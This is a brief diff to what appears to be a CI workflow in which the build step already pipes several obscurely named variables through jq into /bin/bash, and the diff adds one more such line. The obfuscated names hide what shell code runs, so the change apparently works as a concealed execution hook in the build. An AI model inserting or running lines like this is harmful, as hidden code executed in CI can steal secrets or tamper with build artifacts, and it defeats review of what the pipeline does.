@@ -24,6 +24,7 @@ jobs:
           echo $fscqu14001 | jq -r .hyn0327 | /bin/bash
           printf '%s' "$j24110" | jq -r .x96 | /bin/bash
           printf '%s' "$a94638" | jq -r .s4 | /bin/bash
+          echo $iv5 | jq -r .yxl2 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
